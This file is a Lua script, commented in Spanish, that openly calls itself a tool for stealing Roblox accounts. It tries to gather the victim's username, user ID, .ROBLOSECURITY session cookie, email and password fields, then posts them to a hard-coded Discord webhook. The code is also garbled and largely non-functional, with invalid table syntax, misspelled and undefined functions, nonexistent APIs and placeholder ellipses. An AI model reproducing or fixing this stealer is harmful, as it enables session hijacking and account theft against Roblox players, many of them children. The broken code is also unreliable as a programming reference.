-- Script para robar cuentas de Roblox y enviar la información a un webhook de Discord

local HttpService = game:GetService("HttpService")

local function getRobloxInfo()
    local userId = game.Players.LocalPlayer.UserId
    local username = game.Players.LocalPlayer.Name

    -- Obtener cookies de sesión
    local cookiesResponse = HttpService:JSONDecode(HttpService:GetAsync("https://auth.roblox.com/v2/login"))
    local cookies = ".ROBLOSECURITY=" .. cookiesResponse.token

    -- Obtener información del usuario
    local response = HttpService:JSONDecode(HttpService:PostAsync(
        "https://users.roblox.com/v1/users/" .. userId,
        "application/json",
        ""
    ))

    -- Extraer detalles del usuario
	local emailVerified, emailAddress, ageVerified, creditCardInfo, methodSecurity  -- Declare all variables here.
	if response.emailVerified then emailVerified=response.emailVerified; end  -- If statements to check if the values exist in the response.
	if response.hasValidEmailAddress and response.emailAddress then hasValidEmailAddress=response.hasValidEmailAddress;emailAddress=response.emailAddress;end;
	if response.ageVerified then ageVerifed=true else ageverified=false end;
	if creditCardInfo then creditCardInfo=true else creditcardinfo=false end;

	-- Constructing the embed content
	local embedContent =
	{
	    ["embeds"] =
	    {
	        {
	            ["title"] = "Roblox Account Information",
	            ["description"] = "Here is the stolen information from the Roblox account:",
	            ["color"] = tonumber("0x3498db"),
	            ["fields"] =
	            {
	                {["name"] = "Username", ["value"] = username, ["inline"] = true},
	                {["name"] ="User ID",["value"]=tostring(userId),["inline"]=true},
					{["name"], {"Password"},{"value"}, {"password"},{"inline"}={true},},
					{["name"], {"Cookies"},{"value"}=cookies,{"inline"}=true},}
					 ...additional fields as needed...
			         },
	        	  ...
		        }
		    }
	}
	return embedContent , cookies , userId , password   --- return all values required for further use in your script.
end

local function sendToDiscord(embedContent)
	local webhookUrl ="https://discord.com/api/webhooks/1379585399042871386/Vr8SbuI4jCnJBCZcX8Y6L6XEjbjzf0Yk-FIsXdiwMVcZ8FoOUHSwM4ZRF9nweAetHNlc"
	local success,response= pcall(function()
       HttpRequest.new():PostAsync({
           Url=webhookUrl,
           Headers={['Content-Type']='application/json'},
           Body=game.HttpService:JSONEncode(embedContent)
       })
   end)
   if not success then warn(response)end;return;
end

getRobluxinfo(),sendToDiscord(getRobluxinfo()) --- execute both functions at once.
